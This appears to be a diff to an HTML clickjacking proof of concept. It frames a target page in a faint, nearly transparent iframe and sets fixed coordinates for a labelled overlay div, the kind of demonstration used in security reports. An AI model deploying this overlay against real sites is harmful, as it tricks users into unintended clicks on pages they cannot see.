@@ -1,17 +1,19 @@
 <style>
     iframe {
         position:relative;
-        width:1000px;
-        height: 700px;
+        width: 1260px;
+        height: 720px;
         opacity: 0.2;
         z-index: 1;
     }
     div {
         position:absolute;
-        top:$top_value;
-        left:$side_value;
+        top:400;
+        left:385;
         z-index: 2;
     }
 </style>
-<div>This is clickjacking POC</div>
-<iframe src="https://url.com/users/file?id=43"></iframe>
+<div>
+<font size="15" color="Green" face="Comic sans MS"> This is <u><i>Clickjacking</i></u> PoC</font>
+</div>
+<iframe src="https://url.com/users?file=24"></iframe>
